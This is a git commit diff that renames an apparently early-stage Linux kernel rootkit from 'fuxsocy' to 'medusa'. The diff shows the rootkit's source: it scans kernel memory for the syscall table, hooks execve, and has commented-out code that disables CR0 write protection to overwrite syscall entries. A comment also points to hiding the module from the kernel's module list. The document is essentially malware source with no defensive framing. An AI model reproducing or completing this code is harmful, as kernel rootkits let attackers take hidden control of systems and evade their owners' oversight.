e98e7dfe7a4254288b4ffafe52c259c69a256e04
Marco Wang <m.aesophor@gmail.com>
2019-11-29 09:13:28 -0500

    rename project

--- Makefile
+++ Makefile
@@ -1,4 +1,4 @@
-obj-m += fuxsocy.o
+obj-m += medusa.o
 
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
--- medusa.c
+++ medusa.c
@@ -15,27 +15,27 @@ static void fxcy_locate_sys_call_table(void);
 asmlinkage int (*real_execve)(const char *filename, char *const argv[], char *const envp[]);
 
 asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]) {
-  pr_info("ROOTKIT hooked call to execve(%s, ...)\n", filename);
+  pr_info("medusa: hooked call to execve(%s, ...)\n", filename);
   return real_execve(filename, argv, envp);
 }
 
 
-static int __init fuxsocy_init(void) {
-  pr_info("fuxsocy: Hello friend\n");
+static int __init medusa_init(void) {
+  pr_info("medusa: Hello friend\n");
   fxcy_locate_sys_call_table();
   return 0;
 }
 
-static void __exit fuxsocy_exit(void) {
-  pr_info("fuxsocy: Goodbye friend\n");
+static void __exit medusa_exit(void) {
+  pr_info("medusa: Goodbye friend\n");
   /*
-  pr_info("fuxsocy: [*] Disabling cr0 write protection");
+  pr_info("medusa: [*] Disabling cr0 write protection");
   write_cr0(read_cr0() & (~ 0x10000));
 
   fxcy_sys_call_table[__NR_execve] = (unsigned long *) real_execve;
-  pr_info("fuxsocy: restored sys_execve: %p\n", fxcy_sys_call_table[__NR_execve]);
+  pr_info("medusa: restored sys_execve: %p\n", fxcy_sys_call_table[__NR_execve]);
 
-  pr_info("fuxsocy: [*] Re-enabling cr0 write protection");
+  pr_info("medusa: [*] Re-enabling cr0 write protection");
   write_cr0(read_cr0() | 0x10000);
   */
 }
@@ -43,7 +43,7 @@ static void __exit fuxsocy_exit(void) {
 
 static void fxcy_locate_sys_call_table(void) {
   real_sys_read = (void *) kallsyms_lookup_name("sys_read");
-  pr_info("fuxsocy: sys_read: %p\n", real_sys_read);
+  pr_info("medusa: sys_read: %p\n", real_sys_read);
 
   for (ptr = 0xc0000000; ptr <= 0xd0000000; ptr++) {
     fxcy_sys_call_table = (unsigned long **) ptr;
@@ -53,8 +53,8 @@ static void fxcy_locate_sys_call_table(void) {
     }
   }
 
-  pr_info("fuxsocy: sys_call_table: %p\n", fxcy_sys_call_table);
-  pr_info("fuxsocy: sys_read: %p\n", fxcy_sys_call_table[__NR_read]);
+  pr_info("medusa: sys_call_table: %p\n", fxcy_sys_call_table);
+  pr_info("medusa: sys_read: %p\n", fxcy_sys_call_table[__NR_read]);
 
 
   // Backup prev node in module list.
@@ -66,22 +66,22 @@ static void fxcy_locate_sys_call_table(void) {
   module_prev = NULL;
 
   /*
-  pr_info("fuxsocy: [*] Disabling cr0 write protection");
+  pr_info("medusa: [*] Disabling cr0 write protection");
   write_cr0(read_cr0() & (~ 0x10000));
 
   real_execve = (void *) fxcy_sys_call_table[__NR_execve];
-  pr_info("fuxsocy: [*] real_execve: %p\n", real_execve);
+  pr_info("medusa: [*] real_execve: %p\n", real_execve);
 
   fxcy_sys_call_table[__NR_execve] = (unsigned long *) new_execve;
-  pr_info("fuxsocy: new sys_execve: %p\n", fxcy_sys_call_table[__NR_execve]);
+  pr_info("medusa: new sys_execve: %p\n", fxcy_sys_call_table[__NR_execve]);
 
-  pr_info("fuxsocy: [*] Re-enabling cr0 write protection");
+  pr_info("medusa: [*] Re-enabling cr0 write protection");
   write_cr0(read_cr0() | 0x10000);
   */
 }
 
-module_init(fuxsocy_init);
-module_exit(fuxsocy_exit);
+module_init(medusa_init);
+module_exit(medusa_exit);
 
 MODULE_LICENSE("GPL v2");
 MODULE_VERSION("0.01");
